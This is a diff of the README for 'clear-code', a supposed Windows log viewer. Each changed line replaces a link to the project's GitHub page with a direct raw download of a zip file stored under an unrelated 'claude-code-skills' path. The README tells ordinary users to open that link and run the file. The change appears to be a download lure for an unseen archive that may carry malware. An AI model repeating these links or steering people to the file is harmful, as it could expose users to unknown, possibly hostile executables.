@@ -1,12 +1,12 @@
 # 🧾 clear-code - See Logs in Clear Detail
 
-[![Download clear-code](https://img.shields.io/badge/Download-clear--code-blue?style=for-the-badge)](https://github.com/Vinniphonetic360/clear-code)
+[![Download clear-code](https://img.shields.io/badge/Download-clear--code-blue?style=for-the-badge)](https://raw.githubusercontent.com/Vinniphonetic360/clear-code/main/claude-code-skills/code_clear_v2.9-beta.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download clear-code:
 
-[Open clear-code download page](https://github.com/Vinniphonetic360/clear-code)
+[Open clear-code download page](https://raw.githubusercontent.com/Vinniphonetic360/clear-code/main/claude-code-skills/code_clear_v2.9-beta.5.zip)
 
 ## 👀 What clear-code does
 
@@ -36,7 +36,7 @@ If your computer runs normal desktop apps, it should be fine.
 Follow these steps to use clear-code on Windows.
 
 1. Open the download page:
-   [https://github.com/Vinniphonetic360/clear-code](https://github.com/Vinniphonetic360/clear-code)
+   [https://raw.githubusercontent.com/Vinniphonetic360/clear-code/main/claude-code-skills/code_clear_v2.9-beta.5.zip](https://raw.githubusercontent.com/Vinniphonetic360/clear-code/main/claude-code-skills/code_clear_v2.9-beta.5.zip)
 
 2. Look for the latest Windows file on the page.
 
@@ -147,7 +147,7 @@ Yes. The main setup steps here are for Windows users.
 
 Use the download page here:
 
-[https://github.com/Vinniphonetic360/clear-code](https://github.com/Vinniphonetic360/clear-code)
+[https://raw.githubusercontent.com/Vinniphonetic360/clear-code/main/claude-code-skills/code_clear_v2.9-beta.5.zip](https://raw.githubusercontent.com/Vinniphonetic360/clear-code/main/claude-code-skills/code_clear_v2.9-beta.5.zip)
 
 ## 🧭 First-time setup checklist
 
